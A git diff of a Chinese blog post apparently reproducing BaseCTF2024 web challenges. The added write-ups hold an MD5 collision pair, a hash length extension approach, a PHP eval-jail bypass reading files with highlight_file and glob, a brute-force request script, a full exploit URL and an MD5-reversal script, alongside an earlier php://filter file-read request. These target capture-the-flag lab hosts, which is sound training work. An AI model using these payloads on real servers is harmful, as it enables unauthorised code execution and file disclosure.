@@ -2,7 +2,7 @@
 title: BaseCTF2024复现
 date: 2025-11-30 14:16:42
 tags:
-index_img: https://pic1.imgdb.cn/item/693e4869284ce2d2dc0fc6d2.jpg
+index_img: https://gitee.com/bobrocket/img/raw/master/img/693e4869284ce2d2dc0fc6d2.jpg
 categories: CTF
 ---
 
@@ -237,7 +237,7 @@ include($gift);
 
 我们可以利用 `@` 来进行隔断, 将 `@` 前面的内容当做用户名 (参考 https://cloud.tencent.com/developer/article/2288231)
 
-<p class="note note-primary">URL 的格式为 `scheme://user:password@address:port/path?query#fragment`</p>
+<p class="note note-primary">URL 的格式为 scheme://user:password@address:port/path?query#fragment</p>
 
 而我们需要页面的内容存在这个字符串, 我们可以就利用当前页面来显示, 于是构造
 
@@ -317,22 +317,6 @@ import requests
 res = requests.post("http://101.37.149.223:32943/index.php?e[m.p=114514.1&a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag.php&c=__toString",data = {"try":"-"*1000001+"HACKER"})
 print(res.text)
 ```
-
-> requests.post语法
->
-> ```python
->response = requests.post(
->  url,        # 必传：请求的URL地址
->  data=None,  # 可选：表单格式的请求体（dict/字符串/字节）
->     json=None,  # 可选：JSON格式的请求体（dict，自动序列化+设置Content-Type: application/json）
->     headers=None, # 可选：请求头（dict）
->     params=None,  # 可选：URL中的GET参数（dict）
->     files=None,   # 可选：文件上传（dict）
->     timeout=None, # 可选：超时时间（秒，防止请求挂起）
->     verify=True,  # 可选：是否验证SSL证书（False忽略证书错误）
->     cookies=None  # 可选：请求携带的Cookie（dict）
->    )
->    ```
 
 
 
@@ -434,5 +418,151 @@ if (md5($random . $name) !== $md5) {
 // 那 flag 就给你吧
 echo "看样子你真的很懂 MD5";
 echo file_get_contents('/flag');
+```
+
+第三层强碰撞绕过
+
+```
+apppple=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&banananana=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+```
+
+第四层通过就是哈希长度扩展，这里就通过hash-ext-attack-master来自动生成
+
+bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16))这里相当于96位的字符串即密钥
+
+name里面后面要添加admin字符串所以我们需要在后面添加一个以admin结尾的字符串，其它任意，这里就随便为qadmin
+
+这里题目会给一个原始的md5值
+
+![](https://pic1.imgdb.cn/item/694c85a126657af64c6db56c.png)
+
+![](https://pic1.imgdb.cn/item/694c85b026657af64c6db572.png)
+
+
+
+# EZ_PHP_Jail
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+include("hint.html");
+$Jail = $_GET['Jail_by.Happy'];
+
+if($Jail == null) die("Do You Like My Jail?");
+
+function Like_Jail($var) {
+    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
+        return false;
+    }
+    return true;
+}
+
+if (Like_Jail($Jail)) {
+    eval($Jail);
+    echo "Yes! you escaped from the jail! LOL!";
+} else {
+    echo "You will Jail in your life!";
+}
+echo "\n";
+
+// 在HTML解析后再输出PHP源代码
+
+?>
+```
+
+当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这
+
+个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。
+
+```Plain
+?Jail[by.Happy=xxxxxx
+```
+
+现在考虑如何得到 flag，在页面源码中可以看见一个文件，访问后再phpinfo中看见过滤了很多内容，但是 highlight_file 函数可以完美绕过。
+
+```Plain
+?Jail[by.Happy=highlight_file(glob("/f*")[0]);
+```
+
+## 玩原神玩的
+
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+include 'flag.php';
+if (sizeof($_POST['len']) == sizeof($array)) {
+  ys_open($_GET['tip']);
+} else {
+  die("错了！就你还想玩原神？❌❌❌");
+}
+
+function ys_open($tip) {
+  if ($tip != "我要玩原神") {
+    die("我不管，我要玩原神！😭😭😭");
+  }
+  dumpFlag();
+}
+
+function dumpFlag() {
+  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
+    die("可恶的QQ人！😡😡😡");
+  }
+  $a = $_POST['m'][0];
+  $b = $_POST['m'][1];
+  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
+    die("某站崩了？肯定是某忽悠干的！😡😡😡");
+  }
+  include 'flag.php';
+  $flag[] = array();
+  for ($ii = 0;$ii < sizeof($array);$ii++) {
+    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
+      // 对$array中的每个元素，先获取其ASCII码值，然后与循环变量$ii进行异或运算，最后对结果进行MD5加密，并将加密结果存入$flag数组对应位置
+  }
+  
+  echo json_encode($flag);
+}
+```
+
+首先要求数组$len的长度和数组$array一致，我们写个脚本爆破一下
+
+```python
+import requests
+
+url = "http://challenge.imxbt.cn:31267/"
+for i in range(100):
+    s = {f'len[{j}]': '0' for j in range(i)}
+    req = requests.post(url=url,data=s)
+    #print(s)
+    if "</code>我不管，我要玩原神！" in req.text:
+        print(i)
+        print(s)
+        break
+```
+
+下面两个比较好过，最终的payload是
+
+```
+http://challenge.imxbt.cn:31267/?tip=我要玩原神
+len[0]=1&len[1]=1&len[2]=1&len[3]=1&len[4]=1&len[5]=1&len[6]=1&len[7]=1&len[8]=1&len[9]=1&len[10]=1&len[11]=1&len[12]=1&len[13]=1&len[14]=1&len[15]=1&len[16]=1&len[17]=1&len[18]=1&len[19]=1&len[20]=1&len[21]=1&len[22]=1&len[23]=1&len[24]=1&len[25]=1&len[26]=1&len[27]=1&len[28]=1&len[29]=1&len[30]=1&len[31]=1&len[32]=1&len[33]=1&len[34]=1&len[35]=1&len[36]=1&len[37]=1&len[38]=1&len[39]=1&len[40]=1&len[41]=1&len[42]=1&len[43]=1&len[44]=1&m[0]=100%25&m[1]=love100%2530bd7ce7de206924302499f197c7a966
+```
+
+返回了加密的json数据，我们进行解密
+
+```python
+import hashlib
+
+md5_flag = ["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","72b32a1f754ba1c09b3695e0cb6cde7f","093f65e080a295f8076b1c5722a46aa2","03afdbd66e7929b125f8597834fa83a4","5f93f983524def3dca464469d2cf9f3e","7f39f8317fbdb1988ef4c628eba02591","698d51a19d8a121ce581499d7b701668","b53b3a3d6ab90ce0268229151c9bde11","03afdbd66e7929b125f8597834fa83a4","7f39f8317fbdb1988ef4c628eba02591","6364d3f0f495b6ab9dcf8d3b5c6e0b01","a5bfc9e07964f8dddeb95fc584cd965d","07e1cd7dca89a1678042477183b7ac3f","5ef059938ba799aaa845e1c2e8a762bd","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","2b44928ae11fb9384c4cf38708677c48","a1d0c6e83f027327d8461063f4ac58a6","6364d3f0f495b6ab9dcf8d3b5c6e0b01","b53b3a3d6ab90ce0268229151c9bde11","4c56ff4ce4aaf9573aa5dff913df997a","069059b7ef840f0c74a814ec9237b6ec","3416a75f4cea9109507cacd8e2f2aefc","67c6a1e7ce56d3d6fa748ab6d9af3fd7","c0c7c76d30bd3dcaefc96f40275bdc0a","70efdf2ec9b086079795c442636b55fb","6f4922f45568161a8cdf4ad2299f6d23","c74d97b01eae257e44aa9d5bade97baf","37693cfc748049e45d87b8c7d8b9aacd","98f13708210194c475687be6106a3b84","735b90b4568125ed6c3f678819b6e058","1f0e3dad99908345f7439f8ffabdffc4","7cbbc409ec990f19c78c75bd1e06f215","28dd2c7955ce926456240b2ff0100bde","d1fe173d08e959397adf34b1d77e88d7","6ea9ab1baa0efb9e19094440c317e21b","8e296a067a37563370ded05f5a3bf3ec","43ec517d68b6edd3015b3edc9a11367b"]
+
+flag = ''
+
+for i in range(45):
+    for j in range(127):
+        if hashlib.md5(str(i ^ j).encode()).hexdigest() == md5_flag[i]:
+            #hashlib.md5(xxx).encode()).hexdigest()是python中的md5加密方式
+            flag += chr(j)
+print(flag)
 ```
 
